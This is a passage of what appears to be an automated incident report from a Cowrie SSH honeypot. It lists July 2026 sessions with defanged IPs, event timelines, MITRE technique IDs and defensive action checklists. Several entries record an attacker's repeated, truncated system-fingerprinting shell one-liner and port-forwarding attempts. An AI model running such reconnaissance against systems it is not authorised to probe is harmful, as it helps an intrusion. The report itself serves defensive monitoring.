| `2026-07-26 03:26:33` | `cowrie.login.success` |
| `2026-07-26 03:26:34` | `cowrie.session.params` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.success` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:34` | `cowrie.command.input` |
| `2026-07-26 03:26:35` | `cowrie.log.closed` |
| `2026-07-26 03:26:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6da36ba1faef

| Field | Detail |
|---|---|
| **Source IP** | `218.26.205[.]154` |
| **First Seen** | 2026-07-26 03:28 |
| **Last Seen** | 2026-07-26 03:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:28:17` | `cowrie.session.connect` |
| `2026-07-26 03:28:18` | `cowrie.client.version` |
| `2026-07-26 03:28:18` | `cowrie.client.kex` |
| `2026-07-26 03:28:20` | `cowrie.login.success` |
| `2026-07-26 03:28:21` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:28:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.26.205[.]154` to AbuseIPDB if not already reported
- [ ] Block `218.26.205[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6e78e5031bf

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:28 |
| **Last Seen** | 2026-07-26 03:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:28:30` | `cowrie.session.connect` |
| `2026-07-26 03:28:31` | `cowrie.client.version` |
| `2026-07-26 03:28:31` | `cowrie.client.kex` |
| `2026-07-26 03:28:32` | `cowrie.login.success` |
| `2026-07-26 03:28:33` | `cowrie.session.params` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.success` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.command.input` |
| `2026-07-26 03:28:33` | `cowrie.log.closed` |
| `2026-07-26 03:28:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f57589bf2109

| Field | Detail |
|---|---|
| **Source IP** | `46.201.247[.]21` |
| **First Seen** | 2026-07-26 03:28 |
| **Last Seen** | 2026-07-26 03:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:28:30` | `cowrie.session.connect` |
| `2026-07-26 03:28:31` | `cowrie.client.version` |
| `2026-07-26 03:28:31` | `cowrie.client.kex` |
| `2026-07-26 03:28:31` | `cowrie.login.success` |
| `2026-07-26 03:28:32` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.201.247[.]21` to AbuseIPDB if not already reported
- [ ] Block `46.201.247[.]21` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bba4e570f5b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:30 |
| **Last Seen** | 2026-07-26 03:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:30:25` | `cowrie.session.connect` |
| `2026-07-26 03:30:25` | `cowrie.client.version` |
| `2026-07-26 03:30:25` | `cowrie.client.kex` |
| `2026-07-26 03:30:28` | `cowrie.login.success` |
| `2026-07-26 03:30:29` | `cowrie.session.params` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.success` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.command.input` |
| `2026-07-26 03:30:29` | `cowrie.log.closed` |
| `2026-07-26 03:30:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445628a0c747

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:32 |
| **Last Seen** | 2026-07-26 03:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:32:21` | `cowrie.session.connect` |
| `2026-07-26 03:32:21` | `cowrie.client.version` |
| `2026-07-26 03:32:21` | `cowrie.client.kex` |
| `2026-07-26 03:32:23` | `cowrie.login.success` |
| `2026-07-26 03:32:24` | `cowrie.session.params` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.success` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.command.input` |
| `2026-07-26 03:32:24` | `cowrie.log.closed` |
| `2026-07-26 03:32:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79f4939f4191

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:34 |
| **Last Seen** | 2026-07-26 03:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:34:09` | `cowrie.session.connect` |
| `2026-07-26 03:34:10` | `cowrie.client.version` |
| `2026-07-26 03:34:10` | `cowrie.client.kex` |
| `2026-07-26 03:34:12` | `cowrie.login.success` |
| `2026-07-26 03:34:13` | `cowrie.session.params` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.success` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.command.input` |
| `2026-07-26 03:34:13` | `cowrie.log.closed` |
| `2026-07-26 03:34:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7db94af04a3b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:35 |
| **Last Seen** | 2026-07-26 03:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:35:54` | `cowrie.session.connect` |
| `2026-07-26 03:35:55` | `cowrie.client.version` |
| `2026-07-26 03:35:55` | `cowrie.client.kex` |
| `2026-07-26 03:35:56` | `cowrie.login.success` |
| `2026-07-26 03:35:58` | `cowrie.session.params` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.success` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.command.input` |
| `2026-07-26 03:35:58` | `cowrie.log.closed` |
| `2026-07-26 03:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d9ce0fcef11

| Field | Detail |
|---|---|
| **Source IP** | `34.140.165[.]23` |
| **First Seen** | 2026-07-26 03:37 |
| **Last Seen** | 2026-07-26 03:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:37:28` | `cowrie.session.connect` |
| `2026-07-26 03:37:28` | `cowrie.login.success` |
| `2026-07-26 03:37:29` | `cowrie.session.params` |
| `2026-07-26 03:37:29` | `cowrie.command.input` |
| `2026-07-26 03:37:29` | `cowrie.command.input` |
| `2026-07-26 03:37:29` | `cowrie.command.failed` |
| `2026-07-26 03:37:29` | `cowrie.command.input` |
| `2026-07-26 03:37:29` | `cowrie.log.closed` |
| `2026-07-26 03:37:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.165[.]23` to AbuseIPDB if not already reported
- [ ] Block `34.140.165[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0866814f867e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:37 |
| **Last Seen** | 2026-07-26 03:37 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:37:40` | `cowrie.session.connect` |
| `2026-07-26 03:37:41` | `cowrie.client.version` |
| `2026-07-26 03:37:41` | `cowrie.client.kex` |
| `2026-07-26 03:37:43` | `cowrie.login.success` |
| `2026-07-26 03:37:43` | `cowrie.session.params` |
| `2026-07-26 03:37:43` | `cowrie.command.input` |
| `2026-07-26 03:37:43` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.command.success` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:44` | `cowrie.log.closed` |
| `2026-07-26 03:37:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-137699fc8e08

| Field | Detail |
|---|---|
| **Source IP** | `34.140.165[.]23` |
| **First Seen** | 2026-07-26 03:37 |
| **Last Seen** | 2026-07-26 03:37 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:37:41` | `cowrie.session.connect` |
| `2026-07-26 03:37:41` | `cowrie.login.success` |
| `2026-07-26 03:37:42` | `cowrie.session.params` |
| `2026-07-26 03:37:42` | `cowrie.command.input` |
| `2026-07-26 03:37:42` | `cowrie.command.failed` |
| `2026-07-26 03:37:55` | `cowrie.log.closed` |
| `2026-07-26 03:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.165[.]23` to AbuseIPDB if not already reported
- [ ] Block `34.140.165[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cec9df40b43

| Field | Detail |
|---|---|
| **Source IP** | `34.140.165[.]23` |
| **First Seen** | 2026-07-26 03:37 |
| **Last Seen** | 2026-07-26 03:37 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:37:44` | `cowrie.session.connect` |
| `2026-07-26 03:37:44` | `cowrie.login.success` |
| `2026-07-26 03:37:44` | `cowrie.session.params` |
| `2026-07-26 03:37:44` | `cowrie.command.input` |
| `2026-07-26 03:37:55` | `cowrie.log.closed` |
| `2026-07-26 03:37:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.165[.]23` to AbuseIPDB if not already reported
- [ ] Block `34.140.165[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-837098485681

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:39 |
| **Last Seen** | 2026-07-26 03:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:39:19` | `cowrie.session.connect` |
| `2026-07-26 03:39:20` | `cowrie.client.version` |
| `2026-07-26 03:39:20` | `cowrie.client.kex` |
| `2026-07-26 03:39:21` | `cowrie.login.success` |
| `2026-07-26 03:39:23` | `cowrie.session.params` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.success` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.command.input` |
| `2026-07-26 03:39:23` | `cowrie.log.closed` |
| `2026-07-26 03:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6633287496ea

| Field | Detail |
|---|---|
| **Source IP** | `113.11.34[.]221` |
| **First Seen** | 2026-07-26 03:40 |
| **Last Seen** | 2026-07-26 03:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:40:29` | `cowrie.session.connect` |
| `2026-07-26 03:40:30` | `cowrie.client.version` |
| `2026-07-26 03:40:30` | `cowrie.client.kex` |
| `2026-07-26 03:40:32` | `cowrie.login.success` |
| `2026-07-26 03:40:33` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.11.34[.]221` to AbuseIPDB if not already reported
- [ ] Block `113.11.34[.]221` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a506bdd1c6b3

| Field | Detail |
|---|---|
| **Source IP** | `182.160.114[.]72` |
| **First Seen** | 2026-07-26 03:40 |
| **Last Seen** | 2026-07-26 03:40 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:40:38` | `cowrie.session.connect` |
| `2026-07-26 03:40:39` | `cowrie.client.version` |
| `2026-07-26 03:40:39` | `cowrie.client.kex` |
| `2026-07-26 03:40:41` | `cowrie.login.success` |
| `2026-07-26 03:40:42` | `cowrie.direct-tcpip.request` |
| `2026-07-26 03:40:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.160.114[.]72` to AbuseIPDB if not already reported
- [ ] Block `182.160.114[.]72` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-972d358bfac3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:41 |
| **Last Seen** | 2026-07-26 03:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-26 03:41:00` | `cowrie.session.connect` |
| `2026-07-26 03:41:01` | `cowrie.client.version` |
| `2026-07-26 03:41:01` | `cowrie.client.kex` |
| `2026-07-26 03:41:03` | `cowrie.login.success` |
| `2026-07-26 03:41:04` | `cowrie.session.params` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.success` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.command.input` |
| `2026-07-26 03:41:04` | `cowrie.log.closed` |
| `2026-07-26 03:41:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6616edff30b5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-26 03:42 |
| **Last Seen** | 2026-07-26 03:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
